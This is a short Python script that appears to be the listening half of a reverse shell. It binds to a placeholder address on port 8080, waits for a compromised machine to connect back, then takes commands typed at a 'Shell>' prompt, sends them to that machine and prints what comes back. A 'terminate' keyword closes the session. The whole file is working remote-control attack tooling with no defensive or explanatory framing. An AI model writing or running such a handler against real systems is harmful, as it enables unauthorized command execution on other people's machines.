import socket
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("Enter IP", 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()

    print('[+] We got a connection from: ', addr)
    ter = 'terminate'
    while True:
        command = input("\nShell> ")
        if ter in command:
            conn.send(ter.encode('utf-8'))
            conn.close()
            break
        else:
            conn.send(str.encode(command))
            client = str(conn.recv(1024).decode("utf-8"))
            print(client)


def main():
    connect()


main()
